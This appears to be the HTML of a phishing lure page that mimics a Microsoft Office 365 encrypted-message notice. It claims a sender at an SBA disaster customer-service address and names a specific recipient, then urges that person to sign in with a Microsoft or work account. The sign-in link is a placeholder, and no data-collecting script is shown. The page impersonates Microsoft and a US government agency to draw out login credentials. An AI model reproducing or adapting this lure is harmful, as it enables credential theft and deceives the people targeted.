<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8" />
    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>Encrypted Message</title>
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.0.0/dist/css/bootstrap.min.css" rel="stylesheet"
        integrity="sha384-wEmeIV1mKuiNpC+IOBjI7aAzPcEZeedi5yW5f2yOq55WWLwNGmvvx4Um1vskeMj0" crossorigin="anonymous" />
    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.2.1/jquery.min.js"></script>

    <style>
        body {
            height: 100%;
            width: 100%;
            padding: 0;
            margin: 0;
            font-family: "Open Sans", sans-serif;
            color: #222;
            background: #ffffff;
            overflow-x: hidden;
        }

        .header {
            background: #0072c6;
            padding: 8px 20px 8px;
        }

        .header p {
            font-size: 13px;
            color: #ffffff;
            font-weight: 300;
            margin-bottom: 0px;
            padding-bottom: 0px;
        }

        .main-one { 
            margin-top: 12%;
        }

        .main-one h5 {
            font-size: 22px;
            color: #333333;
            font-weight: 400;
            margin-bottom: 20px;
        }

        .main-one p {
            font-size: 14px;
            color: #666666;
            font-weight: 300;
            margin-bottom: 0px;
            padding-bottom: 0px;
        }

        .main-one h6 {
            color: #0172c6;
            font-size: 18px;
            font-weight: 300;
            margin-bottom: 30px;
        }

        .main-one a.sign {
            text-decoration: none;
            font-size: 15px;
            color: #0072c6;
            padding-top: 0px;
            margin-top: 0px;
        }

        .main-one a.sign ion-icon {
            font-size: 30px;
            padding-top: 2px;
            top: 10px;
            position: relative;
        }

        .footer {
            margin-top: 23%;
        }

        .footer p .fas {
            margin-right: 5px;
        }

        .footer p {
            font-size: 13px;
            color: #666666;
        }
    </style>
</head>

<body>
    <div class="header">
        <p>Encrypted Message</p>
    </div>

    <div class="row justify-content-center">
        <div class="col-md-6">
            <div class="main-one">
                <h5>Encrypted message</h5>

                <p>From</p>
                <h6>DisasterCustomerService@sba.gov</h6>

                <p>To</p>
                <h6>carlos@cangaroof.com</h6>

                <p>
                    To view the message, sign in with a Microsoft account, your work or
                    school account, or use a one-time passcode.
                </p>

                <a href="#" class="sign">
                    <ion-icon name="arrow-forward-circle-outline"></ion-icon> Sign in
                </a>
            </div>

            <div class="footer">
                <hr />
                <p>
                    <ion-icon name="lock-closed"></ion-icon> Message encryption by Microsoft
                    Office 365
                </p>
            </div>

        </div>
    </div>




    <script type="module" src="https://unpkg.com/ionicons@5.5.2/dist/ionicons/ionicons.esm.js"></script>
    <script nomodule src="https://unpkg.com/ionicons@5.5.2/dist/ionicons/ionicons.js"></script>
</body>

</html>
